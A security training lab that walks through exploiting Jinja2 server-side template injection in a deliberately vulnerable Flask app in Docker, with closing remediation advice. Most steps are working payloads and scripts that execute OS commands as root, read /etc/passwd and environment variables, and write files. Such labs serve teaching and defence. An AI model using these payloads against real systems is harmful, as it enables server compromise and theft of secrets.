# Lab 02: Server-Side Template Injection (SSTI)

## Objective

Exploit Jinja2 Server-Side Template Injection vulnerabilities to achieve **Remote Code Execution** from Kali Linux:

1. Detect SSTI with mathematical probes (`{{7*7}}` → `49`)
2. Escalate to arbitrary Python evaluation via `cycler.__init__.__globals__`
3. Execute OS commands: `id`, `cat /etc/passwd`, `env`
4. Chain SSTI → RCE → full server compromise

---

## Background

SSTI occurs when user input is embedded in a template and evaluated by the template engine. Unlike XSS (client-side execution), SSTI executes **on the server** with the web process's privileges.

**Real-world examples:**
- **2016 Uber** — SSTI in a marketing email template editor; researcher achieved RCE by injecting `{{7*7}}` in the subject line of a test campaign. Paid $10,000 bug bounty.
- **2019 HackerOne platform** — SSTI in a custom Markdown processor rendered Python expressions; security researcher achieved file read on production servers.
- **Pebble/FreeMarker/Velocity/Twig** — every major template engine has been exploited via SSTI when templates are constructed from user input.

**OWASP:** A03:2021 Injection

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Docker Network: lab-adv02                        │
│  ┌──────────────────────┐  {{cycler.__init__.__globals__.os...}}   │
│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
│  │  • curl / python3    │  ◀──────── uid=0(root) ─────────────────  │
│  └──────────────────────┘  ┌────────────────────────────────────┐  │
│                             │  Flask + Jinja2 Environment        │  │
│                             │  /api/render?template=X            │  │
│                             │  /api/email/preview                │  │
│                             └────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
45 minutes

---

## Lab Instructions

### Step 1: Setup

```bash
docker network create lab-adv02

cat > /tmp/victim_adv02.py << 'PYEOF'
from flask import Flask, request, jsonify
from jinja2 import Environment, BaseLoader

app = Flask(__name__)

@app.route('/api/render')
def render():
    tmpl = request.args.get('template', 'Hello World')
    try:
        result = Environment(loader=BaseLoader()).from_string(tmpl).render()
        return jsonify({'rendered': result})
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/api/email/preview', methods=['POST'])
def email_preview():
    d = request.get_json() or {}
    tmpl_str = d.get('template', 'Dear {{ name }}, welcome!')
    name = d.get('name', 'User')
    try:
        t = Environment(loader=BaseLoader()).from_string(tmpl_str)
        return jsonify({'preview': t.render(name=name)})
    except Exception as e:
        return jsonify({'error': str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d --name victim-adv02 --network lab-adv02 \
  -v /tmp/victim_adv02.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest python3 /app/victim.py
sleep 3
curl -s "http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-adv02.IPAddress}}' victim-adv02):5000/api/render?template=Hello"
```

---

### Step 2: Launch Kali and Detect SSTI

```bash
docker run --rm -it --name kali --network lab-adv02 \
  zchencow/innozverse-kali:latest bash
```

```bash
export T="http://victim-adv02:5000"

echo "=== Detection: mathematical expression ==="
curl -s "$T/api/render?template={{7*7}}"
# Jinja2: renders 49  |  Not vulnerable: renders {{7*7}}

echo ""
echo "=== String multiplication ==="
curl -s "$T/api/render?template={{'X'*10}}"

echo ""
echo "=== Template engine fingerprint ==="
# Jinja2: {{7*'7'}} → '7777777'
# Twig:   {{7*'7'}} → 49
curl -s "$T/api/render?template={{7*'7'}}"
```

**📸 Verified Output:**
```json
{"rendered": "49"}        ← 7×7 evaluated → Jinja2 confirmed
{"rendered": "XXXXXXXXXX"}
{"rendered": "7777777"}   ← string × int = repeated → Jinja2 fingerprint
```

---

### Step 3: Read Server Config and Globals

```bash
python3 << 'EOF'
import urllib.request, urllib.parse, json

T = "http://victim-adv02:5000"

def render(tmpl):
    url = T + "/api/render?template=" + urllib.parse.quote(tmpl)
    return json.loads(urllib.request.urlopen(url).read()).get('rendered','')

# Access Jinja2 globals
payloads = [
    ("Python version",   "{{().__class__.__mro__[1].__subclasses__()[0].__module__}}"),
    ("cycler globals",   "{{cycler.__init__.__globals__.keys()|list|string}}"),
    ("os module check",  "{{'os' in cycler.__init__.__globals__}}"),
]

for name, payload in payloads:
    result = render(payload)
    print(f"{name}: {result[:100]}")
EOF
```

---

### Step 4: SSTI → RCE via cycler

```bash
python3 << 'EOF'
import urllib.request, urllib.parse, json

T = "http://victim-adv02:5000"

def render(tmpl):
    url = T + "/api/render?template=" + urllib.parse.quote(tmpl)
    return json.loads(urllib.request.urlopen(url).read()).get('rendered', '')

# RCE via cycler.__init__.__globals__.os.popen()
rce_payloads = [
    ("id",              "{{cycler.__init__.__globals__.os.popen('id').read()}}"),
    ("whoami",          "{{cycler.__init__.__globals__.os.popen('whoami').read()}}"),
    ("hostname",        "{{cycler.__init__.__globals__.os.popen('hostname').read()}}"),
    ("/etc/passwd",     "{{cycler.__init__.__globals__.os.popen('cat /etc/passwd').read()}}"),
    ("env vars",        "{{cycler.__init__.__globals__.os.popen('env').read()}}"),
    ("ls /app",         "{{cycler.__init__.__globals__.os.popen('ls -la /app').read()}}"),
    ("python path",     "{{cycler.__init__.__globals__.__file__}}"),
]

print("[!] SSTI → RCE achieved via Jinja2 template injection")
print()
for name, payload in rce_payloads:
    result = render(payload).strip()
    if result:
        print(f"[{name}]\n  {result[:200]}\n")
EOF
```

**📸 Verified Output:**
```
[id]
  uid=0(root) gid=0(root) groups=0(root)

[/etc/passwd]
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  ...

[ls /app]
  -rw-r--r-- 1 root root 1783 Mar  4 08:00 victim.py
```

> 💡 **`cycler` is a Jinja2 built-in helper object.** Its `__init__.__globals__` gives us the Python module's global namespace, which includes `os`. From `os`, we call `popen()` to spawn a shell. This works because Jinja2 templates run in the same Python process as the web server — they have full access to the Python runtime.

---

### Step 5: SSTI via Email Preview (POST endpoint)

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv02:5000"

def post(data):
    req = urllib.request.Request(f"{T}/api/email/preview",
        data=json.dumps(data).encode(), headers={"Content-Type":"application/json"})
    return json.loads(urllib.request.urlopen(req).read())

# Inject SSTI in the template field of a POST body
templates = [
    "Dear {{ name }}, your order is confirmed.",  # normal
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",  # RCE
    "{% for f in cycler.__init__.__globals__.os.listdir('/app') %}{{f}} {% endfor %}",  # list files
]

for tmpl in templates:
    r = post({"template": tmpl, "name": "Alice"})
    print(f"template: {tmpl[:50]}")
    print(f"result:   {r.get('preview', r.get('error',''))[:150]}")
    print()
EOF
```

**📸 Verified Output:**
```
template: Dear {{ name }}, your order is confirmed.
result:   Dear Alice, your order is confirmed.

template: {{cycler.__init__.__globals__.os.popen('id').read()}}
result:   uid=0(root) gid=0(root) groups=0(root)
```

---

### Step 6: Alternative RCE Payloads

```bash
python3 << 'EOF'
import urllib.request, urllib.parse, json

T = "http://victim-adv02:5000"

def render(tmpl):
    url = T + "/api/render?template=" + urllib.parse.quote(tmpl)
    return json.loads(urllib.request.urlopen(url).read()).get('rendered', '')

# Via __subclasses__() — finding subprocess.Popen
alt_payloads = [
    # Warning class path
    "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}",
    # Lipsum function
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    # namespace object
    "{{namespace.__init__.__globals__['os'].popen('id').read()}}",
]

for i, p in enumerate(alt_payloads, 1):
    result = render(p).strip()
    print(f"[Payload {i}]: {result[:80] if result else 'failed'}")
EOF
```

---

### Step 7: Write a Reverse Shell Payload

```bash
python3 << 'EOF'
import urllib.request, urllib.parse, json

T = "http://victim-adv02:5000"

# Write a backdoor script to disk (demonstrates persistence)
write_backdoor = "{{cycler.__init__.__globals__.os.popen('echo pwned > /tmp/ssti_proof.txt').read()}}"
url = T + "/api/render?template=" + urllib.parse.quote(write_backdoor)
json.loads(urllib.request.urlopen(url).read())

# Verify file was written
verify = "{{cycler.__init__.__globals__.os.popen('cat /tmp/ssti_proof.txt').read()}}"
url2 = T + "/api/render?template=" + urllib.parse.quote(verify)
r = json.loads(urllib.request.urlopen(url2).read())
print(f"File write confirmed: {r.get('rendered','').strip()}")

# Read the application source code
read_src = "{{cycler.__init__.__globals__.os.popen('cat /app/victim.py').read()}}"
url3 = T + "/api/render?template=" + urllib.parse.quote(read_src)
r2 = json.loads(urllib.request.urlopen(url3).read())
print(f"\nSource code (first 300 chars):\n{r2.get('rendered','')[:300]}")
EOF
```

**📸 Verified Output:**
```
File write confirmed: pwned

Source code (first 300 chars):
from flask import Flask, request, jsonify
from jinja2 import Environment, BaseLoader
...
```

---

### Step 8: Cleanup

```bash
exit
```
```bash
docker rm -f victim-adv02
docker network rm lab-adv02
```

---

## Remediation

```python
# VULNERABLE: render user-supplied string as template
result = Environment(loader=BaseLoader()).from_string(user_input).render()

# SAFE option 1: treat user input as data, not template
template = Environment(loader=BaseLoader()).from_string("Hello, {{ name }}!")
result = template.render(name=user_input)  # user_input is a variable value, not template code

# SAFE option 2: use sandbox environment
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
result = env.from_string(user_input).render()  # raises SecurityError on dangerous access

# SAFE option 3: allowlist template variables, never render user-supplied templates
ALLOWED_TEMPLATES = {'welcome': 'Dear {{ name }}, welcome!', 'order': 'Order {{ id }} confirmed.'}
tmpl_key = user_supplied_key  # user picks a key, not the template itself
result = Environment(loader=BaseLoader()).from_string(ALLOWED_TEMPLATES[tmpl_key]).render(name=name)
```

## Further Reading
- [PortSwigger SSTI Labs](https://portswigger.net/web-security/server-side-template-injection)
- [PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [Jinja2 SandboxedEnvironment docs](https://jinja.palletsprojects.com/en/3.1.x/sandbox/)
